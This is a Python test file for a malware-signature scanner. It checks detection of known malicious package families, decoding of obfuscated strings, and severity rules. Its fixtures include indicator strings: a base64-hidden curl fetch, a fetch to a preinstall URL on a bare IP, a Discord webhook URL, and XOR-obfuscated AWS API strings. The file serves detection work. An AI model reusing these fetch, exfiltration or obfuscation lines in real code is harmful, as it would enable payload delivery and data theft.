"""Known-family signatures: matched in a file's text or in what its obfuscation hides, HIGH,
and never demoted as 'not new'. Fixtures are synthetic strings, not malware."""

import base64
import re

from kitsunox.core.models import Severity
from kitsunox.rules.signatures import (
    RETIRED,
    SIGNATURES,
    KnownSignature,
    Signature,
    decoded_strings,
)
from kitsunox.rules.static import ChannelFollow
from kitsunox.stages.static import ALWAYS_NEW, _demoted, _key

RULE = KnownSignature()
TAVERN = (
    "/create-foundation-model-agreement",
    "AWSInvoicingService.ListInvoiceSummaries",
    "Action=GetCallerIdentity&Version=2011-06-15",
)


def xor_table(strings: tuple[str, ...], key: int) -> str:
    encoded = [base64.b64encode(bytes(b ^ key for b in s.encode())).decode() for s in strings]
    return "const t=[" + ",".join(f'"{e}"' for e in encoded) + f"];const _0x1a2b=0x{key:02x};"


def ids(text: str) -> list[str]:
    return [m.explanation.split(":")[0] for m in RULE.evaluate_text(text)]


def test_signature_ids_are_unique_and_name_their_source() -> None:
    assert len({s.id for s in SIGNATURES}) == len(SIGNATURES)
    assert not {s.id for s in SIGNATURES} & set(RETIRED)  # retired ids are never reused
    assert all(s.seen_in and all("@" in v for v in s.seen_in) for s in SIGNATURES)


def test_a_re_keyed_string_table_is_still_the_family() -> None:
    for key in (0x9F, 0x28, 0x21):  # each republish used another key
        (match,) = RULE.evaluate_text(xor_table((*TAVERN, "decoy"), key))
        assert match.explanation.startswith("Signature KX-0001:")
        assert match.severity is Severity.HIGH and "obfuscation hides" in match.explanation
    assert ids(xor_table(TAVERN[:2], 0x9F)) == []  # every pattern is needed


def test_indicators_in_plain_and_base64_text() -> None:
    url = "https://raw.githubusercontent.com/GamerD11/ping_test/main/test.txt"
    assert ids(f'"dependencies": {{"x": "{url}"}}') == ["Signature KX-0003"]
    hidden = base64.b64encode(f"curl -sf {url}".encode()).decode()
    assert ids(f"const c = Buffer.from('{hidden}', 'base64')") == ["Signature KX-0003"]
    assert ids("fetch('http://38.242.235.206/depconf/x/preinstall?u=')") == ["Signature KX-0004"]
    hook = "https://canary.discord.com/api/webhooks/1566232728179843243/abc"
    assert ids(f"const WEBHOOK_URL = '{hook}';") == ["Signature KX-0010"]


def test_channel_follows_are_channel_follow_not_a_malware_family() -> None:
    """KX-0008/0009/0011 were retired (signatures v3): following channels is unwanted, not
    malware, and `static.channel-follow` matches the forms they matched."""
    jid = base64.b64encode(b"120363351424590490@newsletter").decode()
    channels = "https://raw.githubusercontent.com/mmhdzaidie-dev/idch/refs/heads/main/channel.json"
    forms = (
        'setTimeout(async () => { for (const jid of ["120363351424590490@newsletter"]) '
        "await newsletterWMexQuery(jid, QueryIds.FOLLOW) }, 90000)",
        f"const ids=['{jid}'];newsletterWMexQuery(x, Q.FOLLOW)",
        f"const r = await fetch('{channels}'); // newsletter\n"
        "for (const id of await r.json()) newsletterWMexQuery(id, QueryIds.FOLLOW)",
    )
    for form in forms:
        assert ids(form) == []
        (match,) = ChannelFollow().evaluate_text(form)
        assert match.severity is Severity.MEDIUM and "not by itself a sign of malware" in (
            match.explanation
        )


def test_javascript_obfuscator_strings_are_decoded_in_obfuscated_files() -> None:
    std = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    obf = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"
    hidden = (
        base64.b64encode(b"http://38.242.235.206/depconf")
        .decode()
        .translate(str.maketrans(std, obf))
    )
    names = ";".join(f"var _0x{i:04x}=1" for i in range(0x1A00, 0x1A20))
    assert ids(f"{names};const a=['{hidden}'];") == ["Signature KX-0004"]
    assert ids(f"const a=['{hidden}'];") == []  # not decoded without the tool's identifiers


def test_ordinary_code_and_base64_stay_quiet() -> None:
    text = (
        "const logo = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA"
        "60e6kgAAAABJRU5ErkJggg=='"
    )
    assert ids(text + "\nmodule.exports = { follow: true }") == []
    assert list(decoded_strings("no literals here")) == []


def test_a_known_signature_is_never_not_new() -> None:
    (match,) = RULE.evaluate_text("http://38.242.235.206/depconf")
    assert match.rule_id in ALWAYS_NEW
    assert _demoted(match, "index.js", frozenset({_key(match)})).severity is Severity.HIGH
    # ... but a documentation mention is demoted as usual.
    assert _demoted(match, "README.md", frozenset()).severity is Severity.LOW


def test_a_signature_set_can_be_passed_in() -> None:
    custom = KnownSignature((Signature("KX-T", "test", (re.compile("zzq"),), ("a@1",)),))
    assert [m.explanation.split(":")[0] for m in custom.evaluate_text("zzq")] == ["Signature KX-T"]
